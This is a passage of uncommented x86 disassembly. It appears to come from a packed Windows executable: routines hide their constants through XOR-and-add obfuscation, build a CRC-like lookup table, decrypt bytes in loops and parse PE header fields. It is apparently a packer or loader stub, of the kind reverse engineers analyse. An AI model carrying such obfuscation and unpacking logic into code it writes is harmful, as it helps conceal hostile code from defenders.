  42886d:	add    ecx,edx
  42886f:	add    esi,edx
  428871:	test   esi,ecx
  428873:	mov    esi,DWORD PTR [ebp-0x8]
  428876:	mov    ecx,DWORD PTR [ebp-0x4]
  428879:	je     0x428890
  42887b:	xor    ecx,eax
  42887d:	xor    esi,eax
  42887f:	add    ecx,edx
  428881:	add    esi,edx
  428883:	shr    esi,cl
  428885:	mov    ecx,DWORD PTR [ebp-0x14]
  428888:	xor    ecx,eax
  42888a:	add    ecx,edx
  42888c:	xor    esi,ecx
  42888e:	jmp    0x42889a
  428890:	xor    esi,eax
  428892:	xor    ecx,eax
  428894:	add    esi,edx
  428896:	add    ecx,edx
  428898:	shr    esi,cl
  42889a:	mov    DWORD PTR [ebp-0x8],esi
  42889d:	mov    ecx,DWORD PTR [ebp-0x4]
  4288a0:	xor    ecx,eax
  4288a2:	lea    edi,[edi+ecx*1+0x3272f5]
  4288a9:	mov    ecx,DWORD PTR [ebp-0xc]
  4288ac:	mov    esi,DWORD PTR [ebp-0x4]
  4288af:	xor    esi,eax
  4288b1:	xor    ecx,eax
  4288b3:	sub    ecx,esi
  4288b5:	cmp    edi,ecx
  4288b7:	jbe    0x428863
  4288b9:	mov    eax,DWORD PTR [ebp-0x8]
  4288bc:	pop    edi
  4288bd:	mov    DWORD PTR [ebx],eax
  4288bf:	mov    eax,DWORD PTR [ebp-0x8]
  4288c2:	pop    esi
  4288c3:	leave  
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x38
  4288cb:	push   ebx
  4288cc:	mov    ebx,0xf89c85a5
  4288d1:	mov    DWORD PTR [ebp-0x4],ebx
  4288d4:	lea    ecx,[ebx-0x3]
  4288d7:	mov    DWORD PTR [ebp-0x24],ecx
  4288da:	mov    eax,DWORD PTR [ebp-0x4]
  4288dd:	mov    edx,DWORD PTR [ebp+0x8]
  4288e0:	push   esi
  4288e1:	mov    esi,0x75108ae
  4288e6:	xor    eax,esi
  4288e8:	push   edi
  4288e9:	mov    edi,0x3272f5
  4288ee:	add    eax,edi
  4288f0:	cmp    edx,eax
  4288f2:	mov    eax,DWORD PTR [ebp-0x4]
  4288f5:	je     0x428a5a
  4288fb:	mov    edx,DWORD PTR [ebp+0xc]
  4288fe:	xor    eax,esi
  428900:	add    eax,edi
  428902:	cmp    edx,eax
  428904:	je     0x428a57
  42890a:	mov    eax,DWORD PTR [ebp+0x10]
  42890d:	mov    edx,DWORD PTR [ebp+0xc]
  428910:	mov    DWORD PTR [ebp-0x14],eax
  428913:	mov    eax,DWORD PTR [ebp+0x8]
  428916:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  42891d:	mov    DWORD PTR [ebp-0xc],eax
  428920:	lea    eax,[ebx-0x2]
  428923:	mov    DWORD PTR [ebp-0x1c],eax
  428926:	mov    DWORD PTR [ebp-0x10],ebx
  428929:	mov    DWORD PTR [ebp+0xc],ecx
  42892c:	mov    DWORD PTR [ebp+0x10],eax
  42892f:	mov    eax,DWORD PTR [ebp+0xc]
  428932:	xor    eax,esi
  428934:	mov    DWORD PTR [ebp-0x20],edx
  428937:	sub    edx,eax
  428939:	sub    edx,edi
  42893b:	mov    DWORD PTR [ebp+0x8],edx
  42893e:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428945:	jmp    0x428a47
  42894a:	mov    eax,DWORD PTR [ebp+0xc]
  42894d:	mov    ecx,DWORD PTR [ebp+0xc]
  428950:	xor    eax,esi
  428952:	xor    ecx,esi
  428954:	lea    ecx,[eax+ecx*1+0x64e5ea]
  42895b:	mov    eax,DWORD PTR [ebp+0x8]
  42895e:	xor    edx,edx
  428960:	div    ecx
  428962:	mov    eax,DWORD PTR [ebp+0x10]
  428965:	mov    ecx,DWORD PTR [ebp+0xc]
  428968:	xor    eax,esi
  42896a:	xor    ecx,esi
  42896c:	sub    eax,ecx
  42896e:	cmp    edx,eax
  428970:	jne    0x428a06
  428976:	mov    eax,DWORD PTR [ebp+0x8]
  428979:	mov    ecx,DWORD PTR [ebp-0xc]
  42897c:	mov    dl,BYTE PTR [eax+ecx*1]
  42897f:	mov    eax,DWORD PTR [ebp-0x10]
  428982:	mov    ecx,DWORD PTR [ebp-0x8]
  428985:	xor    eax,esi
  428987:	xor    ecx,esi
  428989:	add    eax,edi
  42898b:	add    ecx,edi
  42898d:	cmp    eax,ecx
  42898f:	jae    0x4289d7
  428991:	lea    ecx,[eax-0x3272f5]
  428997:	mov    DWORD PTR [ebp-0x4],ecx
  42899a:	mov    ebx,DWORD PTR [ebp-0x4]
  42899d:	xor    ebx,esi
  42899f:	add    ebx,0x7f55d8e3
  4289a5:	lea    ecx,[ebp+eax*4-0x38]
  4289a9:	mov    DWORD PTR [ecx],ebx
  4289ab:	mov    ebx,DWORD PTR [ecx]
  4289ad:	cmp    ebx,0x244ecb80
  4289b3:	jbe    0x4289bd
  4289b5:	add    DWORD PTR [ecx],0x405fcc1
  4289bb:	jmp    0x4289c3
  4289bd:	add    DWORD PTR [ecx],0xfdaf433f
  4289c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4289c6:	xor    ecx,esi
  4289c8:	inc    eax
  4289c9:	inc    DWORD PTR [ebp-0x4]
  4289cc:	add    ecx,edi
  4289ce:	cmp    eax,ecx
  4289d0:	jb     0x42899a
  4289d2:	mov    ebx,0xf89c85a5
  4289d7:	cmp    DWORD PTR [ebp-0x14],0x0
  4289db:	jne    0x4289e5
  4289dd:	xor    dl,0x7e
  4289e0:	add    dl,0x3
  4289e3:	jmp    0x4289fb
  4289e5:	mov    eax,DWORD PTR [ebp-0x18]
  4289e8:	xor    al,0xae
  4289ea:	mov    cl,0xb
  4289ec:	sub    cl,al
  4289ee:	add    dl,cl
  4289f0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4289f3:	xor    cl,0xae
  4289f6:	sub    cl,0xb
  4289f9:	ror    dl,cl
  4289fb:	xor    eax,eax
  4289fd:	mov    eax,DWORD PTR [ebp+0x8]
  428a00:	mov    ecx,DWORD PTR [ebp-0xc]
  428a03:	mov    BYTE PTR [eax+ecx*1],dl
  428a06:	mov    eax,DWORD PTR [ebp+0x8]
  428a09:	mov    ecx,DWORD PTR [ebp-0x10]
  428a0c:	sub    eax,edi
  428a0e:	xor    eax,esi
  428a10:	cmp    eax,ecx
  428a12:	jne    0x428a35
  428a14:	mov    eax,DWORD PTR [ebp+0x10]
  428a17:	mov    ecx,DWORD PTR [ebp+0xc]
  428a1a:	xor    eax,esi
  428a1c:	xor    ecx,esi
  428a1e:	sub    eax,ecx
  428a20:	mov    ecx,DWORD PTR [ebp-0x20]
  428a23:	sub    eax,edi
  428a25:	xor    eax,esi
  428a27:	mov    DWORD PTR [ebp+0x10],eax
  428a2a:	mov    eax,DWORD PTR [ebp+0xc]
  428a2d:	xor    eax,esi
  428a2f:	sub    ecx,eax
  428a31:	sub    ecx,edi
  428a33:	jmp    0x428a44
  428a35:	mov    eax,DWORD PTR [ebp+0xc]
  428a38:	xor    eax,esi
  428a3a:	mov    ecx,0xffcd8d0b
  428a3f:	sub    ecx,eax
  428a41:	add    ecx,DWORD PTR [ebp+0x8]
  428a44:	mov    DWORD PTR [ebp+0x8],ecx
  428a47:	mov    eax,DWORD PTR [ebp+0x10]
  428a4a:	cmp    eax,ebx
  428a4c:	jne    0x42894a
  428a52:	mov    eax,DWORD PTR [ebp-0x24]
  428a55:	jmp    0x428a5a
  428a57:	mov    eax,DWORD PTR [ebp-0x4]
  428a5a:	xor    eax,esi
  428a5c:	add    eax,edi
  428a5e:	pop    edi
  428a5f:	pop    esi
  428a60:	pop    ebx
  428a61:	leave  
  428a62:	ret    0xc
  428a65:	push   ebp
  428a66:	mov    ebp,esp
  428a68:	sub    esp,0x420
  428a6e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428a75:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  428a7c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428a83:	push   ebx
  428a84:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  428a8b:	mov    eax,DWORD PTR [ebp-0x14]
  428a8e:	push   esi
  428a8f:	mov    esi,0x75108ae
  428a94:	push   edi
  428a95:	xor    eax,esi
  428a97:	mov    edi,0x3272f5
  428a9c:	add    eax,edi
  428a9e:	mov    DWORD PTR [ebp-0x8],eax
  428aa1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428aa8:	mov    DWORD PTR [ebp-0x4],0xead71885
  428aaf:	mov    DWORD PTR [ebp-0x10],0x8
  428ab6:	mov    ecx,ecx
  428ab8:	mov    eax,DWORD PTR [ebp-0xc]
  428abb:	mov    ecx,DWORD PTR [ebp-0x14]
  428abe:	xor    eax,esi
  428ac0:	xor    ecx,esi
  428ac2:	add    eax,edi
  428ac4:	add    ecx,edi
  428ac6:	imul   eax,ecx
  428ac9:	jmp    0x428afc
  428acb:	mov    eax,DWORD PTR [ebp-0x4]
  428ace:	sub    eax,edi
  428ad0:	xor    eax,esi
  428ad2:	mov    DWORD PTR [ebp-0x8],eax
  428ad5:	lea    ebx,[ebp-0x8]
  428ad8:	call   0x42881d
  428add:	mov    DWORD PTR [ebp-0x8],eax
  428ae0:	mov    eax,DWORD PTR [ebp-0x8]
  428ae3:	mov    ecx,DWORD PTR [ebp-0x4]
  428ae6:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428aed:	mov    eax,DWORD PTR [ebp-0xc]
  428af0:	mov    ecx,DWORD PTR [ebp-0x4]
  428af3:	xor    eax,esi
  428af5:	lea    eax,[eax+ecx*1+0x3272f5]
  428afc:	mov    DWORD PTR [ebp-0x4],eax
  428aff:	mov    eax,DWORD PTR [ebp-0x18]
  428b02:	mov    ecx,DWORD PTR [ebp-0xc]
  428b05:	xor    ecx,esi
  428b07:	xor    eax,esi
  428b09:	sub    eax,ecx
  428b0b:	mov    ecx,DWORD PTR [ebp-0x4]
  428b0e:	cmp    ecx,eax
  428b10:	jbe    0x428acb
  428b12:	mov    eax,DWORD PTR [ebp-0x1c]
  428b15:	xor    eax,esi
  428b17:	add    eax,edi
  428b19:	mov    DWORD PTR [ebp-0x8],eax
  428b1c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428b23:	mov    ebx,ebx
  428b25:	jmp    0x428b88
  428b27:	mov    ecx,DWORD PTR [ebp-0x20]
  428b2a:	mov    eax,DWORD PTR [ebp-0x8]
  428b2d:	xor    ecx,esi
  428b2f:	add    ecx,edi
  428b31:	shr    eax,cl
  428b33:	mov    DWORD PTR [ebp-0x4],eax
  428b36:	mov    eax,DWORD PTR [ebp+0x8]
  428b39:	mov    cl,BYTE PTR [eax]
  428b3b:	mov    BYTE PTR [ebp+0xb],cl
  428b3e:	mov    cl,BYTE PTR [ebp+0xb]
  428b41:	mov    edx,DWORD PTR [ebp-0x8]
  428b44:	movzx  ecx,cl
  428b47:	xor    ecx,edx
  428b49:	mov    DWORD PTR [ebp+0x8],ecx
  428b4c:	mov    ecx,DWORD PTR [ebp-0x18]
  428b4f:	mov    edx,DWORD PTR [ebp+0x8]
  428b52:	xor    ecx,esi
  428b54:	add    ecx,edi
  428b56:	and    ecx,edx
  428b58:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428b5f:	mov    edx,DWORD PTR [ebp-0x4]
  428b62:	xor    ecx,edx
  428b64:	mov    DWORD PTR [ebp-0x8],ecx
  428b67:	mov    ecx,DWORD PTR [ebp-0xc]
  428b6a:	xor    ecx,esi
  428b6c:	lea    eax,[eax+ecx*1+0x3272f5]
  428b73:	mov    DWORD PTR [ebp+0x8],eax
  428b76:	mov    eax,DWORD PTR [ebp-0xc]
  428b79:	xor    eax,esi
  428b7b:	mov    ecx,0xffcd8d0b
  428b80:	sub    ecx,eax
  428b82:	add    ecx,DWORD PTR [ebp-0x10]
  428b85:	mov    DWORD PTR [ebp-0x10],ecx
  428b88:	mov    eax,DWORD PTR [ebp-0x14]
  428b8b:	mov    ecx,DWORD PTR [ebp-0x10]
  428b8e:	xor    eax,esi
  428b90:	add    eax,edi
  428b92:	cmp    ecx,eax
  428b94:	jne    0x428b27
  428b96:	mov    eax,DWORD PTR [ebp-0x1c]
  428b99:	mov    ecx,DWORD PTR [ebp-0x8]
  428b9c:	xor    eax,esi
  428b9e:	add    eax,edi
  428ba0:	pop    edi
  428ba1:	pop    esi
  428ba2:	xor    eax,ecx
  428ba4:	pop    ebx
  428ba5:	leave  
  428ba6:	ret    0x4
  428ba9:	push   ebp
  428baa:	mov    ebp,esp
  428bac:	mov    eax,DWORD PTR [ebp+0x1c]
  428baf:	mov    ecx,DWORD PTR [ebp+0x8]
  428bb2:	mov    edx,DWORD PTR [ebp+0x10]
  428bb5:	mov    eax,DWORD PTR [eax+0x190]
  428bbb:	mov    eax,DWORD PTR [eax]
  428bbd:	sub    esp,0x64
  428bc0:	push   ebx
  428bc1:	push   esi
  428bc2:	push   edi
  428bc3:	mov    edi,0x75108ae
  428bc8:	xor    ecx,edi
  428bca:	mov    ebx,0x3272f5
  428bcf:	add    ecx,ebx
  428bd1:	cmp    ecx,edx
  428bd3:	jne    0x428be4
  428bd5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428bdf:	jmp    0x4290e0
  428be4:	mov    ecx,DWORD PTR [ebp+0x8]
  428be7:	mov    esi,DWORD PTR [ebp+0x14]
  428bea:	mov    edx,DWORD PTR [esi]
  428bec:	xor    ecx,edi
  428bee:	add    ecx,ebx
  428bf0:	cmp    edx,ecx
  428bf2:	je     0x42909b
  428bf8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428bfb:	mov    DWORD PTR [ebp-0x1c],eax
  428bfe:	mov    DWORD PTR [ebp+0x1c],ecx
  428c01:	mov    ecx,DWORD PTR [ebp+0x18]
  428c04:	mov    eax,DWORD PTR [esi]
  428c06:	mov    DWORD PTR [ebp-0x20],eax
  428c09:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428c10:	mov    edx,0xf89c85a2
  428c15:	mov    DWORD PTR [ebp-0x8],edx
  428c18:	mov    eax,DWORD PTR [ebp+0x1c]
  428c1b:	mov    DWORD PTR [ebp+0x1c],eax
  428c1e:	mov    eax,DWORD PTR [ebp+0x1c]
  428c21:	mov    eax,DWORD PTR [eax+0x190]
  428c27:	mov    eax,DWORD PTR [eax]
  428c29:	mov    DWORD PTR [ebp-0x24],ecx
  428c2c:	mov    ecx,DWORD PTR [ebp+0x1c]
  428c2f:	mov    ecx,DWORD PTR [ecx+0x190]
  428c35:	mov    ecx,DWORD PTR [ecx]
  428c37:	add    ecx,DWORD PTR [eax+0x3c]
  428c3a:	mov    DWORD PTR [ebp+0x10],ecx
  428c3d:	mov    eax,DWORD PTR [ebp+0x8]
  428c40:	xor    eax,edi
  428c42:	add    eax,ebx
  428c44:	mov    DWORD PTR [ebp-0x4],eax
  428c47:	mov    eax,DWORD PTR [ebp+0x8]
  428c4a:	xor    eax,edi
  428c4c:	add    eax,ebx
  428c4e:	mov    DWORD PTR [ebp+0x18],eax
  428c51:	mov    eax,DWORD PTR [ebp+0x10]
  428c54:	mov    eax,DWORD PTR [eax+0x50]
  428c57:	sub    eax,0xc
  428c5a:	mov    DWORD PTR [ebp-0x28],eax
  428c5d:	mov    eax,DWORD PTR [ebp+0x10]
  428c60:	mov    eax,DWORD PTR [eax+0x38]
  428c63:	mov    ecx,DWORD PTR [ebp+0x10]
  428c66:	dec    eax
  428c67:	test   DWORD PTR [ecx+0x54],eax
  428c6a:	mov    eax,DWORD PTR [ebp+0x10]
  428c6d:	je     0x428c87
  428c6f:	mov    eax,DWORD PTR [eax+0x38]
  428c72:	mov    ecx,DWORD PTR [ebp+0x10]
  428c75:	mov    ecx,DWORD PTR [ecx+0x54]
  428c78:	dec    eax
  428c79:	not    eax
  428c7b:	and    ecx,eax
  428c7d:	mov    eax,DWORD PTR [ebp+0x10]
  428c80:	mov    eax,DWORD PTR [eax+0x38]
  428c83:	add    eax,ecx
  428c85:	jmp    0x428c8a
  428c87:	mov    eax,DWORD PTR [eax+0x54]
  428c8a:	mov    DWORD PTR [ebp+0x1c],eax
  428c8d:	mov    eax,DWORD PTR [ebp+0x8]
  428c90:	xor    eax,edi
  428c92:	add    eax,ebx
  428c94:	mov    DWORD PTR [ebp+0x18],eax
  428c97:	mov    eax,DWORD PTR [ebp+0x8]
  428c9a:	xor    eax,edi
  428c9c:	add    eax,ebx
  428c9e:	mov    DWORD PTR [ebp+0x18],eax
  428ca1:	mov    eax,DWORD PTR [ebp+0x8]
  428ca4:	mov    ecx,DWORD PTR [ebp-0x24]
  428ca7:	xor    eax,edi
  428ca9:	add    eax,ebx
  428cab:	mov    DWORD PTR [ecx],eax
  428cad:	mov    DWORD PTR [ebp+0x18],edx
  428cb0:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428cb7:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428cbe:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428cc5:	mov    eax,DWORD PTR [ebp-0x8]
  428cc8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428ccb:	xor    eax,edi
  428ccd:	add    eax,ebx
  428ccf:	imul   eax,ecx
  428cd2:	mov    ecx,DWORD PTR [ebp+0x8]
  428cd5:	mov    edx,DWORD PTR [ebp-0x28]
  428cd8:	xor    ecx,edi
  428cda:	lea    ecx,[ecx+edx*1+0x3272f5]
  428ce1:	cmp    eax,ecx
  428ce3:	jae    0x429094
  428ce9:	mov    eax,DWORD PTR [ebp+0x8]
  428cec:	xor    eax,edi
  428cee:	add    eax,ebx
  428cf0:	mov    DWORD PTR [ebp+0x18],eax
  428cf3:	mov    eax,DWORD PTR [ebp+0x1c]
  428cf6:	add    eax,DWORD PTR [ebp-0x1c]
  428cf9:	mov    DWORD PTR [ebp-0x4],eax
  428cfc:	push   DWORD PTR [ebp-0x4]
  428cff:	mov    esi,DWORD PTR [ebp-0x1c]
  428d02:	mov    ecx,DWORD PTR [ebp+0x10]
  428d05:	call   0x427e55
  428d0a:	mov    DWORD PTR [ebp+0xc],eax
  428d0d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428d14:	mov    eax,DWORD PTR [ebp-0x18]
  428d17:	xor    eax,edi
  428d19:	lea    ecx,[ebp-0x40]
  428d1c:	add    eax,ebx
  428d1e:	push   ecx
  428d1f:	call   0x4283e9
  428d24:	mov    eax,DWORD PTR [ebp+0xc]
  428d27:	test   eax,eax
  428d29:	je     0x428d79
  428d2b:	mov    eax,DWORD PTR [ebp-0x18]
  428d2e:	xor    eax,edi
  428d30:	add    eax,ebx
  428d32:	push   eax
  428d33:	push   DWORD PTR [ebp+0xc]
  428d36:	lea    eax,[ebp-0x40]
  428d39:	push   eax
  428d3a:	call   0x4282df
  428d3f:	mov    eax,DWORD PTR [ebp-0x4]
  428d42:	mov    DWORD PTR [ebp-0x18],eax
  428d45:	mov    eax,DWORD PTR [ebp-0x18]
  428d48:	mov    ecx,DWORD PTR [ebp-0x1c]
  428d4b:	sub    eax,ecx
  428d4d:	mov    DWORD PTR [ebp-0x18],eax
  428d50:	mov    eax,DWORD PTR [ebp+0xc]
  428d53:	mov    ecx,DWORD PTR [ebp+0xc]
  428d56:	mov    eax,DWORD PTR [eax+0x10]
  428d59:	add    eax,DWORD PTR [ecx+0xc]
  428d5c:	mov    ecx,DWORD PTR [ebp-0x18]
  428d5f:	cmp    ecx,eax
  428d61:	jb     0x428d79
  428d63:	mov    eax,DWORD PTR [ebp+0xc]
  428d66:	mov    eax,DWORD PTR [eax+0xc]
  428d69:	mov    ecx,DWORD PTR [ebp+0xc]
  428d6c:	add    eax,DWORD PTR [ecx+0x8]
  428d6f:	mov    ecx,DWORD PTR [ebp-0x18]
  428d72:	sub    eax,ecx
  428d74:	jmp    0x429067
  428d79:	push   0xc
  428d7b:	push   DWORD PTR [ebp-0x4]
  428d7e:	lea    eax,[ebp-0x4c]
  428d81:	push   eax
  428d82:	call   0x4282df
  428d87:	mov    eax,0xf89c85a5
  428d8c:	mov    DWORD PTR [ebp-0x2c],eax
  428d8f:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428d96:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428d9d:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428da4:	lea    ecx,[ebp-0x2c]
  428da7:	mov    DWORD PTR [ebp-0xc],ecx
  428daa:	lea    ecx,[ebp-0x30]
  428dad:	mov    DWORD PTR [ebp-0x10],ecx
  428db0:	lea    ecx,[ebp-0x34]
  428db3:	mov    DWORD PTR [ebp+0xc],ecx
  428db6:	lea    ecx,[ebp-0x38]
  428db9:	mov    DWORD PTR [ebp-0x14],ecx
  428dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  428dbf:	xor    ecx,edi
  428dc1:	add    ecx,ebx
  428dc3:	mov    DWORD PTR [ebp-0x18],ecx
  428dc6:	jmp    0x428fc2
  428dcb:	cmp    eax,0xf89c85a3
  428dd0:	je     0x428fd4
  428dd6:	mov    ecx,DWORD PTR [ebp-0x8]
  428dd9:	xor    ecx,edi
  428ddb:	mov    esi,eax
  428ddd:	add    ecx,ebx
  428ddf:	mov    DWORD PTR [ebp+0x18],ecx
  428de2:	mov    eax,DWORD PTR [ebp-0x18]
  428de5:	xor    esi,edi
  428de7:	lea    eax,[eax+esi*1+0x3272f5]
  428dee:	mov    DWORD PTR [ebp-0x18],eax
  428df1:	mov    eax,DWORD PTR [ebp-0x8]
  428df4:	mov    ecx,DWORD PTR [ebp-0x18]
  428df7:	xor    eax,edi
  428df9:	add    eax,ebx
  428dfb:	cmp    ecx,eax
  428dfd:	jne    0x428e12
  428dff:	mov    eax,DWORD PTR [ebp+0x8]
  428e02:	xor    eax,edi
  428e04:	add    eax,ebx
  428e06:	push   eax
  428e07:	push   0xc
  428e09:	lea    eax,[ebp-0x4c]
  428e0c:	push   eax
  428e0d:	call   0x4288c5
  428e12:	mov    eax,DWORD PTR [ebp-0xc]
  428e15:	mov    eax,DWORD PTR [eax]
  428e17:	xor    eax,edi
  428e19:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e20:	mov    ecx,DWORD PTR [ebp+0x8]
  428e23:	xor    ecx,edi
  428e25:	movzx  eax,al
  428e28:	add    ecx,ebx
  428e2a:	cmp    eax,ecx
  428e2c:	je     0x428faa
  428e32:	mov    eax,DWORD PTR [ebp-0x10]
  428e35:	mov    eax,DWORD PTR [eax]
  428e37:	xor    eax,edi
  428e39:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e40:	mov    ecx,DWORD PTR [ebp+0x8]
  428e43:	xor    ecx,edi
  428e45:	movzx  eax,al
  428e48:	add    ecx,ebx
  428e4a:	cmp    eax,ecx
  428e4c:	je     0x428faa
  428e52:	mov    eax,DWORD PTR [ebp+0xc]
  428e55:	mov    eax,DWORD PTR [eax]
  428e57:	xor    eax,edi
  428e59:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e60:	mov    ecx,DWORD PTR [ebp+0x8]
  428e63:	xor    ecx,edi
  428e65:	movzx  eax,al
  428e68:	add    ecx,ebx
  428e6a:	cmp    eax,ecx
  428e6c:	je     0x428faa
  428e72:	mov    eax,DWORD PTR [ebp-0x14]
  428e75:	mov    eax,DWORD PTR [eax]
  428e77:	xor    eax,edi
  428e79:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e80:	mov    ecx,DWORD PTR [ebp+0x8]
  428e83:	xor    ecx,edi
  428e85:	movzx  eax,al
  428e88:	add    ecx,ebx
  428e8a:	cmp    eax,ecx
  428e8c:	je     0x428faa
  428e92:	mov    eax,DWORD PTR [ebp-0x10]
  428e95:	mov    eax,DWORD PTR [eax]
  428e97:	xor    eax,edi
  428e99:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ea0:	mov    ecx,DWORD PTR [ebp-0xc]
  428ea3:	mov    ecx,DWORD PTR [ecx]
  428ea5:	xor    ecx,edi
  428ea7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428eae:	xor    al,cl
  428eb0:	mov    ecx,DWORD PTR [ebp+0xc]
  428eb3:	mov    ecx,DWORD PTR [ecx]
  428eb5:	xor    ecx,edi
  428eb7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ebe:	or     al,cl
  428ec0:	mov    ecx,DWORD PTR [ebp-0xc]
  428ec3:	mov    ecx,DWORD PTR [ecx]
  428ec5:	xor    ecx,edi
  428ec7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428ece:	cmp    cl,al
  428ed0:	jne    0x428faa
  428ed6:	mov    eax,DWORD PTR [ebp+0xc]
  428ed9:	mov    eax,DWORD PTR [eax]
  428edb:	xor    eax,edi
  428edd:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428ee4:	mov    ecx,DWORD PTR [ebp-0x10]
  428ee7:	mov    ecx,DWORD PTR [ecx]
  428ee9:	xor    ecx,edi
  428eeb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ef2:	xor    al,cl
  428ef4:	mov    ecx,DWORD PTR [ebp-0x14]
  428ef7:	mov    ecx,DWORD PTR [ecx]
  428ef9:	xor    ecx,edi
  428efb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f02:	or     al,cl
  428f04:	mov    ecx,DWORD PTR [ebp-0x10]
  428f07:	mov    ecx,DWORD PTR [ecx]
  428f09:	xor    ecx,edi
  428f0b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f12:	cmp    cl,al
  428f14:	jne    0x428faa
  428f1a:	mov    eax,DWORD PTR [ebp-0x14]
  428f1d:	mov    eax,DWORD PTR [eax]
  428f1f:	xor    eax,edi
  428f21:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f28:	mov    ecx,DWORD PTR [ebp+0xc]
  428f2b:	mov    ecx,DWORD PTR [ecx]
  428f2d:	xor    ecx,edi
  428f2f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f36:	xor    al,cl
  428f38:	mov    ecx,DWORD PTR [ebp-0xc]
  428f3b:	mov    ecx,DWORD PTR [ecx]
  428f3d:	xor    ecx,edi
  428f3f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f46:	or     al,cl
  428f48:	mov    ecx,DWORD PTR [ebp+0xc]
  428f4b:	mov    ecx,DWORD PTR [ecx]
  428f4d:	xor    ecx,edi
  428f4f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f56:	cmp    cl,al
  428f58:	jne    0x428faa
  428f5a:	mov    eax,DWORD PTR [ebp-0x14]
  428f5d:	mov    eax,DWORD PTR [eax]
  428f5f:	xor    eax,edi
  428f61:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428f68:	mov    ecx,DWORD PTR [ebp-0xc]
  428f6b:	mov    ecx,DWORD PTR [ecx]
  428f6d:	xor    ecx,edi
  428f6f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f76:	xor    al,cl
  428f78:	mov    ecx,DWORD PTR [ebp-0x10]
  428f7b:	mov    ecx,DWORD PTR [ecx]
  428f7d:	xor    ecx,edi
  428f7f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428f86:	or     al,cl
  428f88:	mov    ecx,DWORD PTR [ebp-0x14]
  428f8b:	mov    ecx,DWORD PTR [ecx]
  428f8d:	xor    ecx,edi
  428f8f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428f96:	cmp    cl,al
  428f98:	jne    0x428faa
  428f9a:	lea    eax,[ebp-0x4c]
  428f9d:	push   eax
  428f9e:	call   0x428a65
  428fa3:	mov    ecx,DWORD PTR [ebp-0x44]
  428fa6:	cmp    eax,ecx
  428fa8:	je     0x428fb4
  428faa:	mov    eax,DWORD PTR [ebp+0x8]
  428fad:	xor    eax,edi
  428faf:	add    eax,ebx
  428fb1:	mov    DWORD PTR [ebp+0x18],eax
  428fb4:	mov    eax,DWORD PTR [ebp-0x8]
  428fb7:	xor    eax,edi
  428fb9:	lea    eax,[eax+esi*1+0x3272f5]
  428fc0:	xor    eax,edi
  428fc2:	mov    ecx,DWORD PTR [ebp+0x8]
  428fc5:	mov    edx,DWORD PTR [ebp+0x18]
  428fc8:	xor    ecx,edi
  428fca:	add    ecx,ebx
  428fcc:	cmp    edx,ecx
  428fce:	je     0x428dcb
  428fd4:	mov    eax,DWORD PTR [ebp+0x8]
  428fd7:	mov    ecx,DWORD PTR [ebp+0x18]
  428fda:	xor    eax,edi
  428fdc:	add    eax,ebx
  428fde:	cmp    ecx,eax
  428fe0:	jne    0x428ff3
  428fe2:	mov    eax,DWORD PTR [ebp-0x8]
  428fe5:	mov    ecx,DWORD PTR [ebp+0x1c]
  428fe8:	xor    eax,edi
  428fea:	lea    eax,[eax+ecx*1+0x3272f5]
  428ff1:	jmp    0x42906a
  428ff3:	push   0x18
  428ff5:	push   DWORD PTR [ebp-0x4]
  428ff8:	lea    eax,[ebp-0x64]
  428ffb:	push   eax
  428ffc:	call   0x4282df
  429001:	mov    eax,DWORD PTR [ebp+0x8]
  429004:	mov    ecx,DWORD PTR [ebp-0x18]
  429007:	xor    eax,edi
  429009:	add    eax,ebx
  42900b:	cmp    eax,ecx
  42900d:	je     0x429022
  42900f:	mov    eax,DWORD PTR [ebp+0x8]
  429012:	xor    eax,edi
  429014:	add    eax,ebx
  429016:	push   eax
  429017:	push   0x18
  429019:	lea    eax,[ebp-0x64]
  42901c:	push   eax
  42901d:	call   0x4288c5
  429022:	mov    eax,DWORD PTR [ebp-0x4]
  429025:	add    eax,0x18
